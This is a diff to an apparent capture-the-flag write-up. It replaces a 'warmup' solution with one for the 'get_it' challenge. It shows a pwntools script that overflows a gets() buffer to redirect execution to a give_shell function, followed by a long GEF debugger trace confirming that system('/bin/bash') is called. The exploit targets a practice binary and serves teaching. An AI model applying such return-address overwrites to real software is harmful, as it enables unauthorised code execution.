@@ -133,29 +133,369 @@ So we can see that after `0x48` bytes of input, we start overwriting the return 
 ```
 from pwn import *
 
-target = process('./warmup')
-#gdb.attach(target, gdbscript = 'b *0x4006a3')
+target = process("./get_it")
+gdb.attach(target, gdbscript = 'b *0x4005f1')
 
-# Make the payload
-payload = ""
-payload += "0"*0x48 # Overflow the buffer up to the return address
-payload += p64(0x40060d) # Overwrite the return address with the address of the `easy` function
+input()
+
+payload = b""
+payload += b"0"*40 # Padding to the return address
+payload += p64(0x4005b6) # Address of give_shell in least endian, will be new saved return address
 
 # Send the payload
 target.sendline(payload)
 
+# Drop to an interactive shell to use the new shell
 target.interactive()
 ```
 
-When we run it:
+So one thing about this particular challenge. If you run the explouit on more modern versions of Ubuntu, it will probably crash. With pwning, we sometimes run into weird problems caused by the enviornment we run the binary on. This is one of those. Depending on the version of Ubuntu we run this on, this exploit will or will not work. I believe this is because of a stack alignment issue.
+
+I would say the important thing is, as long as call the `give_shell` function is called, we should consider this challenge was solved. That is the actual intended solution for this challenge:
+
 ```
-$    python exploit.py
-[+] Starting local process './warmup': pid 4652
-[*] Switching to interactive mode
--Warm Up-
-WOW:0x40060d
->flag{g0ttem_b0yz}
-[*] Got EOF while reading in interactive
+Breakpoint 1, 0x00000000004005f1 in main ()
+
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x007ffc1aa6c630  →  0x3030303030303030 ("00000000"?)
+$rbx   : 0x00000000400600  →  <__libc_csu_init+0> push r15
+$rcx   : 0x007f3c5ae85980  →  0x00000000fbad2088
+$rdx   : 0x0               
+$rsp   : 0x007ffc1aa6c620  →  0x007ffc1aa6c748  →  0x007ffc1aa6e413  →  "./get_it"
+$rbp   : 0x007ffc1aa6c650  →  0x3030303030303030 ("00000000"?)
+$rsi   : 0x00000001f316b1  →  0x3030303030303030 ("00000000"?)
+$rdi   : 0x007f3c5ae877f0  →  0x0000000000000000
+$rip   : 0x000000004005f1  →  <main+42> mov eax, 0x0
+$r8    : 0x007ffc1aa6c630  →  0x3030303030303030 ("00000000"?)
+$r9    : 0x0               
+$r10   : 0xfffffffffffff364
+$r11   : 0x246             
+$r12   : 0x000000004004c0  →  <_start+0> xor ebp, ebp
+$r13   : 0x007ffc1aa6c740  →  0x0000000000000001
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
+───────────────────────────────────────────────────────────────────── stack ────
+0x007ffc1aa6c620│+0x0000: 0x007ffc1aa6c748  →  0x007ffc1aa6e413  →  "./get_it"   ← $rsp
+0x007ffc1aa6c628│+0x0008: 0x0000000100400600
+0x007ffc1aa6c630│+0x0010: 0x3030303030303030     ← $rax, $r8
+0x007ffc1aa6c638│+0x0018: 0x3030303030303030
+0x007ffc1aa6c640│+0x0020: 0x3030303030303030
+0x007ffc1aa6c648│+0x0028: 0x3030303030303030
+0x007ffc1aa6c650│+0x0030: 0x3030303030303030     ← $rbp
+0x007ffc1aa6c658│+0x0038: 0x000000004005b6  →  <give_shell+0> push rbp
+─────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x4005e4 <main+29>        mov    rdi, rax
+     0x4005e7 <main+32>        mov    eax, 0x0
+     0x4005ec <main+37>        call   0x4004a0 <gets@plt>
+●→   0x4005f1 <main+42>        mov    eax, 0x0
+     0x4005f6 <main+47>        leave  
+     0x4005f7 <main+48>        ret    
+     0x4005f8                  nop    DWORD PTR [rax+rax*1+0x0]
+     0x400600 <__libc_csu_init+0> push   r15
+     0x400602 <__libc_csu_init+2> push   r14
+─────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "get_it", stopped 0x4005f1 in main (), reason: BREAKPOINT
+───────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x4005f1 → main()
+────────────────────────────────────────────────────────────────────────────────
+gef➤  si
+0x00000000004005f6 in main ()
+
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x0               
+$rbx   : 0x00000000400600  →  <__libc_csu_init+0> push r15
+$rcx   : 0x007f3c5ae85980  →  0x00000000fbad2088
+$rdx   : 0x0               
+$rsp   : 0x007ffc1aa6c620  →  0x007ffc1aa6c748  →  0x007ffc1aa6e413  →  "./get_it"
+$rbp   : 0x007ffc1aa6c650  →  0x3030303030303030 ("00000000"?)
+$rsi   : 0x00000001f316b1  →  0x3030303030303030 ("00000000"?)
+$rdi   : 0x007f3c5ae877f0  →  0x0000000000000000
+$rip   : 0x000000004005f6  →  <main+47> leave 
+$r8    : 0x007ffc1aa6c630  →  0x3030303030303030 ("00000000"?)
+$r9    : 0x0               
+$r10   : 0xfffffffffffff364
+$r11   : 0x246             
+$r12   : 0x000000004004c0  →  <_start+0> xor ebp, ebp
+$r13   : 0x007ffc1aa6c740  →  0x0000000000000001
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
+───────────────────────────────────────────────────────────────────── stack ────
+0x007ffc1aa6c620│+0x0000: 0x007ffc1aa6c748  →  0x007ffc1aa6e413  →  "./get_it"   ← $rsp
+0x007ffc1aa6c628│+0x0008: 0x0000000100400600
+0x007ffc1aa6c630│+0x0010: 0x3030303030303030     ← $r8
+0x007ffc1aa6c638│+0x0018: 0x3030303030303030
+0x007ffc1aa6c640│+0x0020: 0x3030303030303030
+0x007ffc1aa6c648│+0x0028: 0x3030303030303030
+0x007ffc1aa6c650│+0x0030: 0x3030303030303030     ← $rbp
+0x007ffc1aa6c658│+0x0038: 0x000000004005b6  →  <give_shell+0> push rbp
+─────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x4005e7 <main+32>        mov    eax, 0x0
+     0x4005ec <main+37>        call   0x4004a0 <gets@plt>
+●    0x4005f1 <main+42>        mov    eax, 0x0
+ →   0x4005f6 <main+47>        leave  
+     0x4005f7 <main+48>        ret    
+     0x4005f8                  nop    DWORD PTR [rax+rax*1+0x0]
+     0x400600 <__libc_csu_init+0> push   r15
+     0x400602 <__libc_csu_init+2> push   r14
+     0x400604 <__libc_csu_init+4> mov    r15d, edi
+─────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "get_it", stopped 0x4005f6 in main (), reason: SINGLE STEP
+───────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x4005f6 → main()
+────────────────────────────────────────────────────────────────────────────────
+gef➤  si
+0x00000000004005f7 in main ()
+
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x0               
+$rbx   : 0x00000000400600  →  <__libc_csu_init+0> push r15
+$rcx   : 0x007f3c5ae85980  →  0x00000000fbad2088
+$rdx   : 0x0               
+$rsp   : 0x007ffc1aa6c658  →  0x000000004005b6  →  <give_shell+0> push rbp
+$rbp   : 0x3030303030303030 ("00000000"?)
+$rsi   : 0x00000001f316b1  →  0x3030303030303030 ("00000000"?)
+$rdi   : 0x007f3c5ae877f0  →  0x0000000000000000
+$rip   : 0x000000004005f7  →  <main+48> ret 
+$r8    : 0x007ffc1aa6c630  →  0x3030303030303030 ("00000000"?)
+$r9    : 0x0               
+$r10   : 0xfffffffffffff364
+$r11   : 0x246             
+$r12   : 0x000000004004c0  →  <_start+0> xor ebp, ebp
+$r13   : 0x007ffc1aa6c740  →  0x0000000000000001
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
+───────────────────────────────────────────────────────────────────── stack ────
+0x007ffc1aa6c658│+0x0000: 0x000000004005b6  →  <give_shell+0> push rbp   ← $rsp
+0x007ffc1aa6c660│+0x0008: 0x0000000200000000
+0x007ffc1aa6c668│+0x0010: 0x007ffc1aa6c748  →  0x007ffc1aa6e413  →  "./get_it"
+0x007ffc1aa6c670│+0x0018: 0x000000015ae817a0
+0x007ffc1aa6c678│+0x0020: 0x000000004005c7  →  <main+0> push rbp
+0x007ffc1aa6c680│+0x0028: 0x00000000400600  →  <__libc_csu_init+0> push r15
+0x007ffc1aa6c688│+0x0030: 0xaba209cb5252b7a6
+0x007ffc1aa6c690│+0x0038: 0x000000004004c0  →  <_start+0> xor ebp, ebp
+─────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x4005ec <main+37>        call   0x4004a0 <gets@plt>
+●    0x4005f1 <main+42>        mov    eax, 0x0
+     0x4005f6 <main+47>        leave  
+ →   0x4005f7 <main+48>        ret    
+   ↳    0x4005b6 <give_shell+0>   push   rbp
+        0x4005b7 <give_shell+1>   mov    rbp, rsp
+        0x4005ba <give_shell+4>   mov    edi, 0x400684
+        0x4005bf <give_shell+9>   call   0x400480 <system@plt>
+        0x4005c4 <give_shell+14>  nop    
+        0x4005c5 <give_shell+15>  pop    rbp
+─────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "get_it", stopped 0x4005f7 in main (), reason: SINGLE STEP
+───────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x4005f7 → main()
+────────────────────────────────────────────────────────────────────────────────
+gef➤  si
+0x00000000004005b6 in give_shell ()
+
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x0               
+$rbx   : 0x00000000400600  →  <__libc_csu_init+0> push r15
+$rcx   : 0x007f3c5ae85980  →  0x00000000fbad2088
+$rdx   : 0x0               
+$rsp   : 0x007ffc1aa6c660  →  0x0000000200000000
+$rbp   : 0x3030303030303030 ("00000000"?)
+$rsi   : 0x00000001f316b1  →  0x3030303030303030 ("00000000"?)
+$rdi   : 0x007f3c5ae877f0  →  0x0000000000000000
+$rip   : 0x000000004005b6  →  <give_shell+0> push rbp
+$r8    : 0x007ffc1aa6c630  →  0x3030303030303030 ("00000000"?)
+$r9    : 0x0               
+$r10   : 0xfffffffffffff364
+$r11   : 0x246             
+$r12   : 0x000000004004c0  →  <_start+0> xor ebp, ebp
+$r13   : 0x007ffc1aa6c740  →  0x0000000000000001
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
+───────────────────────────────────────────────────────────────────── stack ────
+0x007ffc1aa6c660│+0x0000: 0x0000000200000000     ← $rsp
+0x007ffc1aa6c668│+0x0008: 0x007ffc1aa6c748  →  0x007ffc1aa6e413  →  "./get_it"
+0x007ffc1aa6c670│+0x0010: 0x000000015ae817a0
+0x007ffc1aa6c678│+0x0018: 0x000000004005c7  →  <main+0> push rbp
+0x007ffc1aa6c680│+0x0020: 0x00000000400600  →  <__libc_csu_init+0> push r15
+0x007ffc1aa6c688│+0x0028: 0xaba209cb5252b7a6
+0x007ffc1aa6c690│+0x0030: 0x000000004004c0  →  <_start+0> xor ebp, ebp
+0x007ffc1aa6c698│+0x0038: 0x007ffc1aa6c740  →  0x0000000000000001
+─────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x4005ae <frame_dummy+30> call   rax
+     0x4005b0 <frame_dummy+32> pop    rbp
+     0x4005b1 <frame_dummy+33> jmp    0x400530 <register_tm_clones>
+ →   0x4005b6 <give_shell+0>   push   rbp
+     0x4005b7 <give_shell+1>   mov    rbp, rsp
+     0x4005ba <give_shell+4>   mov    edi, 0x400684
+     0x4005bf <give_shell+9>   call   0x400480 <system@plt>
+     0x4005c4 <give_shell+14>  nop    
+     0x4005c5 <give_shell+15>  pop    rbp
+─────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "get_it", stopped 0x4005b6 in give_shell (), reason: SINGLE STEP
+───────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x4005b6 → give_shell()
+────────────────────────────────────────────────────────────────────────────────
+gef➤  si
+0x00000000004005b7 in give_shell ()
+
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x0               
+$rbx   : 0x00000000400600  →  <__libc_csu_init+0> push r15
+$rcx   : 0x007f3c5ae85980  →  0x00000000fbad2088
+$rdx   : 0x0               
+$rsp   : 0x007ffc1aa6c658  →  "00000000"
+$rbp   : 0x3030303030303030 ("00000000"?)
+$rsi   : 0x00000001f316b1  →  0x3030303030303030 ("00000000"?)
+$rdi   : 0x007f3c5ae877f0  →  0x0000000000000000
+$rip   : 0x000000004005b7  →  <give_shell+1> mov rbp, rsp
+$r8    : 0x007ffc1aa6c630  →  "000000000000000000000000000000000000000000000000"
+$r9    : 0x0               
+$r10   : 0xfffffffffffff364
+$r11   : 0x246             
+$r12   : 0x000000004004c0  →  <_start+0> xor ebp, ebp
+$r13   : 0x007ffc1aa6c740  →  0x0000000000000001
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
+───────────────────────────────────────────────────────────────────── stack ────
+0x007ffc1aa6c658│+0x0000: "00000000"     ← $rsp
+0x007ffc1aa6c660│+0x0008: 0x0000000200000000
+0x007ffc1aa6c668│+0x0010: 0x007ffc1aa6c748  →  0x007ffc1aa6e413  →  "./get_it"
+0x007ffc1aa6c670│+0x0018: 0x000000015ae817a0
+0x007ffc1aa6c678│+0x0020: 0x000000004005c7  →  <main+0> push rbp
+0x007ffc1aa6c680│+0x0028: 0x00000000400600  →  <__libc_csu_init+0> push r15
+0x007ffc1aa6c688│+0x0030: 0xaba209cb5252b7a6
+0x007ffc1aa6c690│+0x0038: 0x000000004004c0  →  <_start+0> xor ebp, ebp
+─────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x4005b0 <frame_dummy+32> pop    rbp
+     0x4005b1 <frame_dummy+33> jmp    0x400530 <register_tm_clones>
+     0x4005b6 <give_shell+0>   push   rbp
+ →   0x4005b7 <give_shell+1>   mov    rbp, rsp
+     0x4005ba <give_shell+4>   mov    edi, 0x400684
+     0x4005bf <give_shell+9>   call   0x400480 <system@plt>
+     0x4005c4 <give_shell+14>  nop    
+     0x4005c5 <give_shell+15>  pop    rbp
+     0x4005c6 <give_shell+16>  ret    
+─────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "get_it", stopped 0x4005b7 in give_shell (), reason: SINGLE STEP
+───────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x4005b7 → give_shell()
+────────────────────────────────────────────────────────────────────────────────
+gef➤  si
+0x00000000004005ba in give_shell ()
+
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x0               
+$rbx   : 0x00000000400600  →  <__libc_csu_init+0> push r15
+$rcx   : 0x007f3c5ae85980  →  0x00000000fbad2088
+$rdx   : 0x0               
+$rsp   : 0x007ffc1aa6c658  →  "00000000"
+$rbp   : 0x007ffc1aa6c658  →  "00000000"
+$rsi   : 0x00000001f316b1  →  0x3030303030303030 ("00000000"?)
+$rdi   : 0x007f3c5ae877f0  →  0x0000000000000000
+$rip   : 0x000000004005ba  →  <give_shell+4> mov edi, 0x400684
+$r8    : 0x007ffc1aa6c630  →  "000000000000000000000000000000000000000000000000"
+$r9    : 0x0               
+$r10   : 0xfffffffffffff364
+$r11   : 0x246             
+$r12   : 0x000000004004c0  →  <_start+0> xor ebp, ebp
+$r13   : 0x007ffc1aa6c740  →  0x0000000000000001
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
+───────────────────────────────────────────────────────────────────── stack ────
+0x007ffc1aa6c658│+0x0000: "00000000"     ← $rsp, $rbp
+0x007ffc1aa6c660│+0x0008: 0x0000000200000000
+0x007ffc1aa6c668│+0x0010: 0x007ffc1aa6c748  →  0x007ffc1aa6e413  →  "./get_it"
+0x007ffc1aa6c670│+0x0018: 0x000000015ae817a0
+0x007ffc1aa6c678│+0x0020: 0x000000004005c7  →  <main+0> push rbp
+0x007ffc1aa6c680│+0x0028: 0x00000000400600  →  <__libc_csu_init+0> push r15
+0x007ffc1aa6c688│+0x0030: 0xaba209cb5252b7a6
+0x007ffc1aa6c690│+0x0038: 0x000000004004c0  →  <_start+0> xor ebp, ebp
+─────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x4005b1 <frame_dummy+33> jmp    0x400530 <register_tm_clones>
+     0x4005b6 <give_shell+0>   push   rbp
+     0x4005b7 <give_shell+1>   mov    rbp, rsp
+ →   0x4005ba <give_shell+4>   mov    edi, 0x400684
+     0x4005bf <give_shell+9>   call   0x400480 <system@plt>
+     0x4005c4 <give_shell+14>  nop    
+     0x4005c5 <give_shell+15>  pop    rbp
+     0x4005c6 <give_shell+16>  ret    
+     0x4005c7 <main+0>         push   rbp
+─────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "get_it", stopped 0x4005ba in give_shell (), reason: SINGLE STEP
+───────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x4005ba → give_shell()
+────────────────────────────────────────────────────────────────────────────────
+gef➤  si
+0x00000000004005bf in give_shell ()
+
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x0               
+$rbx   : 0x00000000400600  →  <__libc_csu_init+0> push r15
+$rcx   : 0x007f3c5ae85980  →  0x00000000fbad2088
+$rdx   : 0x0               
+$rsp   : 0x007ffc1aa6c658  →  "00000000"
+$rbp   : 0x007ffc1aa6c658  →  "00000000"
+$rsi   : 0x00000001f316b1  →  0x3030303030303030 ("00000000"?)
+$rdi   : 0x00000000400684  →  "/bin/bash"
+$rip   : 0x000000004005bf  →  <give_shell+9> call 0x400480 <system@plt>
+$r8    : 0x007ffc1aa6c630  →  "000000000000000000000000000000000000000000000000"
+$r9    : 0x0               
+$r10   : 0xfffffffffffff364
+$r11   : 0x246             
+$r12   : 0x000000004004c0  →  <_start+0> xor ebp, ebp
+$r13   : 0x007ffc1aa6c740  →  0x0000000000000001
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
+───────────────────────────────────────────────────────────────────── stack ────
+0x007ffc1aa6c658│+0x0000: "00000000"     ← $rsp, $rbp
+0x007ffc1aa6c660│+0x0008: 0x0000000200000000
+0x007ffc1aa6c668│+0x0010: 0x007ffc1aa6c748  →  0x007ffc1aa6e413  →  "./get_it"
+0x007ffc1aa6c670│+0x0018: 0x000000015ae817a0
+0x007ffc1aa6c678│+0x0020: 0x000000004005c7  →  <main+0> push rbp
+0x007ffc1aa6c680│+0x0028: 0x00000000400600  →  <__libc_csu_init+0> push r15
+0x007ffc1aa6c688│+0x0030: 0xaba209cb5252b7a6
+0x007ffc1aa6c690│+0x0038: 0x000000004004c0  →  <_start+0> xor ebp, ebp
+─────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x4005b6 <give_shell+0>   push   rbp
+     0x4005b7 <give_shell+1>   mov    rbp, rsp
+     0x4005ba <give_shell+4>   mov    edi, 0x400684
+ →   0x4005bf <give_shell+9>   call   0x400480 <system@plt>
+   ↳    0x400480 <system@plt+0>   jmp    QWORD PTR [rip+0x200b9a]        # 0x601020 <system@got.plt>
+        0x400486 <system@plt+6>   push   0x1
+        0x40048b <system@plt+11>  jmp    0x400460
+        0x400490 <__libc_start_main@plt+0> jmp    QWORD PTR [rip+0x200b92]        # 0x601028 <__libc_start_main@got.plt>
+        0x400496 <__libc_start_main@plt+6> push   0x2
+        0x40049b <__libc_start_main@plt+11> jmp    0x400460
+─────────────────────────────────────────────────────── arguments (guessed) ────
+system@plt (
+   $rdi = 0x00000000400684 → "/bin/bash"
+)
+─────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "get_it", stopped 0x4005bf in give_shell (), reason: SINGLE STEP
+───────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x4005bf → give_shell()
+────────────────────────────────────────────────────────────────────────────────
+gef➤  
 ```
 
-Just like that, we got the flag! As a sidenote, I've heard of instances where in certain enviornments the offset is `0x40` instead of `0x48`.
+So there in gdb, we see that `give_shell` was called, which called `system` with `"/bin/bash"`, which was the intended solution.
